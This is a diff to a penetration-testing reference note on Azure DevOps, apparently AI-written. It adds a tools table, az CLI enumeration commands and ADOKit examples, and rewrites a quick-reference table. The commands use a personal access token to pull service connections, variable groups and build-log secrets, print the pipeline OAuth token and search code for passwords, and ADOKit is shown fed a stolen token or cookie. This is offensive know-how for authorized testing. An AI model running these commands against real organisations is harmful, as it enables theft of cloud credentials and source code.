@@ -1,6 +1,8 @@
 # Azure DevOps (ADO)
 
-## What is it?
+#AzureDevOps #ADO #Microsoft #CICD #webservices #secrets
+
+## What is Azure DevOps?
 Azure DevOps (ADO) is Microsoft's DevOps platform — includes Repos (Git), Pipelines (CI/CD), Boards (work items), Artifacts (package registry), and Test Plans. Extremely high-value target: CI/CD pipelines run code, service connections hold cloud credentials, repos contain source code and secrets, and pipeline agents often have privileged access to production environments.
 
 Deployment:
@@ -17,6 +19,18 @@ Deployment:
 | 8080 | TCP | ADO Server default HTTP |
 | 8443 | TCP | ADO Server default HTTPS |
 | 22 | TCP | SSH for Git (cloud: ssh.dev.azure.com) |
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/File Transfer/cURL\|cURL]] | Raw REST API — projects, repos, pipelines, service connections, variable groups, code search |
+| [[Tools/Cloud/azure-cli\|azure-cli]] | Native `az devops`/`az pipelines` enumeration with a PAT — cleaner than raw curl |
+| [[Tools/Web/ADOKit\|ADOKit]] | Purpose-built ADO attack toolkit (recon / privesc / persistence modules) via the REST API |
+| [[Tools/Recon/trufflehog\|TruffleHog]] | Verified-secret scanning across cloned repos and git history |
+| [[Tools/Recon/gitleaks\|gitleaks]] | Regex/entropy secret scanning of repos, incl. full history |
 
 ---
 
@@ -56,6 +70,35 @@ curl -sk "https://dev.azure.com/<org>/<project>/_apis/build/builds?api-version=7
 
 # Shodan
 http.title:"Azure DevOps Server" product:"Microsoft-IIS"
+```
+
+### Azure CLI (`az devops`) — authenticated enum
+
+The `azure-devops` CLI extension is far more usable than raw curl once you hold a PAT. See [[Tools/Cloud/azure-cli|azure-cli]].
+
+```bash
+az extension add --name azure-devops
+export AZURE_DEVOPS_EXT_PAT=<PAT>                 # CLI reads the PAT from this env var
+az devops configure --defaults organization=https://dev.azure.com/<org>
+
+az devops project list                            # projects in the org
+az repos list --project <proj> -o table           # repos
+az pipelines list --project <proj> -o table       # build/YAML pipelines
+az pipelines build list --project <proj> --top 20 # recent runs (logs = secret source)
+az devops service-endpoint list --project <proj>  # service connections (cloud creds)
+az pipelines variable-group list --project <proj> # variable groups (secrets)
+az devops user list --org https://dev.azure.com/<org>   # org users (org-admin PAT)
+```
+
+### ADOKit — automated attack modules
+
+[[Tools/Web/ADOKit|ADOKit]] (X-Force Red, C#) wraps the REST API into recon / privesc / persistence modules — feed it a PAT or a stolen auth cookie:
+
+```bash
+# Examples (Windows binary): validate a token, sweep for secrets, list orgs
+ADOKit.exe validatecred /credential:<PAT> /url:https://dev.azure.com/<org>
+ADOKit.exe searchcode   /credential:<PAT> /url:https://dev.azure.com/<org> /search:password
+ADOKit.exe listorgs     /credential:<PAT>
 ```
 
 ---
@@ -393,7 +436,7 @@ netsh http show urlacl
 
 ---
 
-## Dangerous Configurations
+## Dangerous Settings
 
 | Config | Risk |
 |--------|------|
@@ -412,28 +455,20 @@ netsh http show urlacl
 
 ## Quick Reference
 
-```bash
-# Test PAT token
-curl -sk "https://dev.azure.com/<org>/_apis/projects?api-version=7.0" -u ":<PAT>"
+| Goal | Command |
+|---|---|
+| Test PAT | `curl -sk "https://dev.azure.com/<org>/_apis/projects?api-version=7.0" -u ":<PAT>"` |
+| List repos | `curl -sk ".../_apis/git/repositories?api-version=7.0" -u ":<PAT>" \| jq '.value[].name'` |
+| Service connections (cloud creds) | `curl -sk ".../_apis/serviceendpoint/endpoints?api-version=7.0" -u ":<PAT>"` |
+| Variable groups (secrets) | `curl -sk ".../_apis/distributedtask/variablegroups?api-version=7.0" -u ":<PAT>"` |
+| CLI enum | `export AZURE_DEVOPS_EXT_PAT=<PAT>; az devops project list` |
+| Build-log secret dump | `curl -sk ".../_apis/build/builds/<id>/logs/<log-id>?api-version=7.0" -u ":<PAT>" \| grep -iE "secret\|token\|password"` |
+| Print pipeline OAuth token | YAML step: `echo "$(System.AccessToken)"` (needs "allow scripts to access OAuth token") |
+| Code search for secrets | `curl -sk -X POST ".../_apis/search/codesearchresults?api-version=7.0" -u ":<PAT>" -d '{"searchText":"password"}'` |
+| Toolkit recon | `ADOKit.exe searchcode /credential:<PAT> /url:https://dev.azure.com/<org> /search:password` |
 
-# List all repos
-curl -sk "https://dev.azure.com/<org>/<project>/_apis/git/repositories?api-version=7.0" -u ":<PAT>" | jq '.value[].name'
+---
 
-# List service connections (cloud creds)
-curl -sk "https://dev.azure.com/<org>/<project>/_apis/serviceendpoint/endpoints?api-version=7.0" -u ":<PAT>" | jq '.value[] | {name:.name, type:.type}'
-
-# List variable groups (secrets)
-curl -sk "https://dev.azure.com/<org>/<project>/_apis/distributedtask/variablegroups?api-version=7.0" -u ":<PAT>" | jq '.value[].name'
-
-# Build log dump — search for leaked secrets
-curl -sk "https://dev.azure.com/<org>/<project>/_apis/build/builds/<id>/logs/<log-id>?api-version=7.0" -u ":<PAT>" | grep -iE "secret|token|password|key"
-
-# Clone all repos
-curl -sk "https://dev.azure.com/<org>/<project>/_apis/git/repositories?api-version=7.0" -u ":<PAT>" | \
-  jq -r '.value[].remoteUrl' | xargs -I{} git clone "https://:<PAT>@{#https://}"
-
-# Search code for secrets
-curl -sk -X POST "https://almsearch.dev.azure.com/<org>/_apis/search/codesearchresults?api-version=7.0" \
-  -u ":<PAT>" -H "Content-Type: application/json" \
-  -d '{"searchText":"password","$skip":0,"$top":50}'
-```
+*Created: 2026-07-13*
+*Updated: 2026-09-24*
+*Model: claude-opus-4-8*
